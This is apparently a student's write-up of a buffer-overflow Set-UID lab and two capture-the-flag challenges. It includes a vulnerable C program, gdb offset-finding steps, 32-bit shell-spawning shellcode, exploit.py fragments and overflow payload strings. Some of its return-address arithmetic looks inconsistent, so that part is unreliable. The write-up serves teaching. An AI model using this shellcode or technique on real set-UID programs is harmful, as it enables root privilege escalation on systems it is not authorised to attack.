# Buffer Overflow Attack Lab (Set-UID Version)

## Task 1
On the terminal, after running the a32.out or the a64.out files, a shell is generated. Initially this shell is placed inside the folder that contains those same files and allows us to write any shellcode and execute it.

## Task 2
We are supposed to run an exploit in the given C file:

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Changing this size will change the layout of the stack.
 * Instructors can change this value each year, so students
 * won't be able to use the solutions from the past.
 */
 
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

void dummy_function(char *str);

int bof(char *str)
{
    char buffer[BUF_SIZE];

    // The following statement has a buffer overflow problem 
    strcpy(buffer, str);       

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r"); 
    if (!badfile) {
       perror("Opening badfile"); exit(1);
    }

    int length = fread(str, sizeof(char), 517, badfile);
    printf("Input size: %d\n", length);
    dummy_function(str);
    fprintf(stdout, "==== Returned Properly ====\n");
    return 1;
}

// This function is used to insert a stack frame of size 
// 1000 (approximately) between main's and bof's stack frames. 
// The function itself does not do anything. 
void dummy_function(char *str)
{
    char dummy_buffer[1000];
    memset(dummy_buffer, 0, 1000);
    bof(str);
}

The file has a buffer overflow vunerability in the strcpy command because the function doesn't check for boundaries, that means that if the program is a root owned set-UID file we can feed the function a string that makes it spawn a root shell

For this to be exploitable it is needed for the OS safeguards be turned off and for the the code to be compiled with the following flags 

-z execstack -fno-stack-protector

## Task 3

First we need to find the address of where our program is running in the memory. In order to do that we have to compile the program on debug mode (-g option). When debugging we will be able to find the ebp and offset so we can have the right buffer payload to run our program. 

Running our program in debug mode:
`gdb stack-L1-dbg`

Then we set a breakpoint on bof and then run the program:

`b bof`
output: Breakpoint 1 at 0x12ad: file stack.c, line 16.

`run`
The program stops when hits the bof function because of the breakpoint that we created. The values of the stack frame for this function will be used on the badfile. 

`p $ebp`
output: $1 = (void *) 0xffffcfb8

`p &buffer`
output: $2 = (char (*)[100]) 0xffffcb3c

As we can see, the frame pointer is on 0xffffcfb8, so the return address must be stores at 0xffffcfb8+4, then the first address we can jump is 0xffffcfb8+8. 
We need to know where we should store the return address in the input in order for it to be stored in the return address filed in the slack. We can find that just by doing the diference between return and buffer start address.
`p/d 0xffffcfb8 - 0xffffcb3c`
output: $3 = 1148

As we can see the distance between the return address and the start buffer is 1148+4 so the return address must be storires with offset of 1152 in badfile.

**We now have to edit the file exploit.py to fill the content for badfile.** 

**We used a 32 bit shellcode:**

shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
"\xd2\x31\xc0\xb0\x0b\xcd\x80" 
).encode('latin-1')

**we know that our string size is 517, so we should start at 517 minus the lenght of our shellcode**

start = 517-len(shellcode)   

**The content should be the shellcode itself**

content[start: start+len(shellcode)] = shellcode

**The return adress is given by the buffer and the ebp:**

buff =  0xffffcb3c

ebp =   0xffffcfb8

offset = ebp - buff + 4

ret = buff + ebp + 200

By compiling and executing our program exploit.py, we will generate the badfile content. 
After running our program` ./stack` we shoud be able to gain control as a root, that is, a shell prompt will be available. 

# Challenge 1
Analyzing the source code of the program in question, you can see that it reads a file identified by the string meme_file.

```c
char meme_file[8] = "mem.txt\0";
char buffer[20];
```

By modifying the content of this string, which by definition has the value mem.txt\0, it is possible to control the file that is being read.

To do this, it is possible to take advantage of a buffer-overflow present in the program.

The buffer string has 20 characters allocated, however, 28 characters are read by scanf.
The extra 8 characters that we write will be inserted into the meme_file string.

So, just write any 20 characters (bytes) in the terminal and add "flag.txt" at the end, so that the contents of meme_file will change and the file to be read will be the one containing the flag.

```python
r.sendline(b"aaaaaaaaaaaaaaaaaaaaflag.txt")
```
## Result:
By running python3 exploit-example.py
![imagem CMD](https://git.fe.up.pt/fsi/fsi2223/l08g06/-/blob/main/desafio1.jpg)

# Challenge 2

In the new version of the code, an extra check (val == 0xfefc2223) has been added to make it more difficult to read the file, however, this does not completely mitigate the problem as it is still possible to bypass it using a similar technique as in the previous challenge.

```c
char val[4] = "\xef\xbe\xad\xde";
...
if(*(int*)val == 0xfefc2223) { ... } else { ... }
```

The only added difficulty to this challenge that challenge 1 didn't have, was to write the Hex into the sendline to be accepted and use flag.txt afterwards.

```python
r.sendline(b'12345678912345678912\x23\x22\xfc\xfeflag.txt')
```

## Result:
By running python3 exploit-example.py
![imagem CMD](https://git.fe.up.pt/fsi/fsi2223/l08g06/-/blob/main/desafio2.jpg)
